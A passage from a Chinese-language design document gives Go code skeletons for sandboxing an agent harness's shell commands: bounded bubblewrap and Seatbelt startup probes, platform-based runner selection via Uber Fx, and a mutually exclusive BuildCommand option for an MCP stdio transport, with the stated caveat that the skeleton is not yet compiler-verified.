package sandbox

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"

)

// probeTimeout 探针必须有界：探针卡死会让 Fx OnStart 永久阻塞。
const probeTimeout = 10 * time.Second

// runProbe 带超时运行探针命令；ctx 来自 OnStart hook，超时或取消即杀进程返回。
func runProbe(ctx context.Context, cmd *exec.Cmd) (string, error) {
	var buf bytes.Buffer
	cmd.Stdout, cmd.Stderr = &buf, &buf
	if err := cmd.Start(); err != nil {
		return buf.String(), err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	select {
	case err := <-done:
		return buf.String(), err
	case <-ctx.Done():
		_ = cmd.Process.Kill()
		<-done // WaitDelay 保证有界回收
		return buf.String(), fmt.Errorf("探针超时/取消: %w", ctx.Err())
	}
}

// 两个探针都复用生产 Builder——探的就是真实构造路径，杜绝探针/生产漂移。

// ProbeBubblewrap 用完整生产参数组合跑 `-- /bin/sh -c 'exit 0'`（§5.1：
// 不能只探 namespace，会把二进制缺失误判为 namespace 不可用）。
func ProbeBubblewrap(ctx context.Context, r *BubblewrapRunner) error {
	ctx, cancel := context.WithTimeout(ctx, probeTimeout)
	defer cancel()
	cmd, err := r.BuildShell("exit 0", CommandSpec{
		WorkDir:    r.workspaceRoot,
		PayloadEnv: SandboxBaseEnv(r.workspaceRoot, "/tmp"),
	})
	if err != nil {
		return err
	}
	out, err := runProbe(ctx, cmd)
	if err == nil {
		return nil
	}
	switch {
	case strings.Contains(out, "No permissions to create new namespace"),
		strings.Contains(out, "setting up uid map"):
		return fmt.Errorf("bwrap 不可用（内核/AppArmor 禁止 user namespace）: %s", out)
	case strings.Contains(out, "Can't find source path"):
		return fmt.Errorf("bwrap 固定挂载源缺失（检查系统路径与 WorkspaceRoot）: %s", out)
	default:
		return fmt.Errorf("bwrap 探针失败: %w: %s", err, out)
	}
}

// ProbeSeatbelt 跑完整 profile 的 `exit 0`（§5.5）。
func ProbeSeatbelt(ctx context.Context, r *SeatbeltRunner) error {
	ctx, cancel := context.WithTimeout(ctx, probeTimeout)
	defer cancel()
	cmd, err := r.BuildShell("exit 0", CommandSpec{
		WorkDir:    r.workspaceRoot,
		PayloadEnv: SandboxBaseEnv(r.workspaceRoot, r.tmpDir),
	})
	if err != nil {
		return err
	}
	if out, err := runProbe(ctx, cmd); err != nil {
		return fmt.Errorf("seatbelt 探针失败: %w: %s", err, out)
	}
	return nil
}
```

### 14.7 平台自动选择与 Fx 装配（§6 / §8）

`config.Config` 不增加任何 sandbox 字段。产品策略全部固定在组合根：网络 `allow`、宿主环境透传为空、额外挂载为空。

```go
// pi/harness/sandbox/platform.go——固定平台策略的单一入口。
func NewRunner(workspaceRoot string) (Runner, error) {
	switch runtime.GOOS {
	case "darwin":
		return NewSeatbeltRunner("/usr/bin/sandbox-exec", workspaceRoot)
	case "linux":
		path, err := exec.LookPath("bwrap")
		if err != nil {
			return nil, fmt.Errorf("sandbox: bwrap 二进制不可用: %w", err)
		}
		return NewBubblewrapRunner(path, workspaceRoot)
	case "windows":
		return NewHostRunner(), nil
	default:
		return nil, fmt.Errorf("sandbox: 不支持的平台 %s", runtime.GOOS)
	}
}

// pi/register.go：SDK 默认 Provider（§8 CommandRunnerRegister，与 CoreRegister 同层；
// 注册层引用 command 包，command 本身不 import fx）。
var CommandRunnerRegister = fx.Provide(func() sandbox.Runner { return sandbox.NewHostRunner() })

// infrastructure/driver/sandbox/driver.go——go-reagent 产品的唯一选择点。
var Register = fx.Options(
      fx.Decorate(chooseRunner),
	fx.Invoke(forceInstantiateRunner),
)

func chooseRunner(workDir pi.WorkDir) (sandbox.Runner, error) {
	return sandbox.NewRunner(string(workDir))
}
```

OnStart：探针带超时并复用 OnStart 传入的 ctx：

```go
// forceInstantiateRunner 由 fx.Invoke 注册在 OnStart：强制实例化 Runner 并执行
// 后端探针，保证 Fx 惰性构造下"配置了沙箱但从未实例化"也必然触发校验。
func forceInstantiateRunner(lc fx.Lifecycle, runner sandbox.Runner) error {
	lc.Append(fx.Hook{OnStart: func(ctx context.Context) error {
		switch r := runner.(type) {
		case *sandbox.SeatbeltRunner:
			return sandbox.ProbeSeatbelt(ctx, r) // ctx 已由探针内部加超时
		case *sandbox.BubblewrapRunner:
			return sandbox.ProbeBubblewrap(ctx, r) // §5.1 完整参数组合
		default: // host 无需探针
			return nil
		}
	}})
	return nil
}
```

> 装配规则：`pi.Register` 提供 SDK 默认 HostRunner；go-reagent 的 CLI（配置模式与 env 模式）和 server 均无条件注册 sandbox driver。SDK 其他调用方不注册 driver 时仍保持 Host 行为。

### 14.8 `pi/mcp/transport_stdio.go`——`BuildCommand` 回调（§7，含行为增量）

```go
type StdioTransportOptions struct {
	// ...现有 Command/Args/Env/WorkDir 字段不变...

	// BuildCommand 与旧字段严格互斥（§7）。
	BuildCommand func() (*exec.Cmd, error)
}

// NewStdioTransport 构造期互斥校验（两半配置静默拼接即报错）。
func NewStdioTransport(options StdioTransportOptions, ...) (*StdioTransport, error) {
	if options.BuildCommand != nil {
		if options.Command != "" || len(options.Args) > 0 ||
			len(options.Env) > 0 || options.WorkDir != "" {
			return nil, errors.New("mcp: BuildCommand 与 Command/Args/Env/WorkDir 互斥")
		}
	} else if options.Command == "" {
		return nil, errors.New("mcp: Command 必填（未提供 BuildCommand 时）")
	}
	// ...其余现有构造逻辑...
}

// start 的行为增量：
func (t *StdioTransport) start(ctx context.Context) (*exec.Cmd, error) {
	if t.options.BuildCommand != nil {
		command, err := t.options.BuildCommand()
		if err != nil {
			return nil, err
		}
		if command == nil {
			return nil, errors.New("mcp: BuildCommand 返回 nil 命令")
		}
		// 进程组设置收口到 Runner（§7）：不再调用 configureProcessGroup，
		// 否则两者都会给 SysProcAttr 赋值互相覆盖。
		return command, nil
	}
	command := exec.Command(t.options.Command, t.options.Args...) // 现状路径不变
	configureProcessGroup(command)
	return command, nil
}
```

---

**骨架与正文的对应关系**：14.1↔§4；14.2↔§4.1/§5.3 host 行；14.3↔§5.2/§5.3；14.4↔§5.1/§5.4；14.5↔§5.5；14.6↔§6.3/§8；14.7↔§6/§8；14.8↔§7。测试断言以 §12 为准，不在骨架内展开。骨架仍未经编译器验证——实施第 1 步即以 `go build` 通过 + §12 断言对齐为验收。
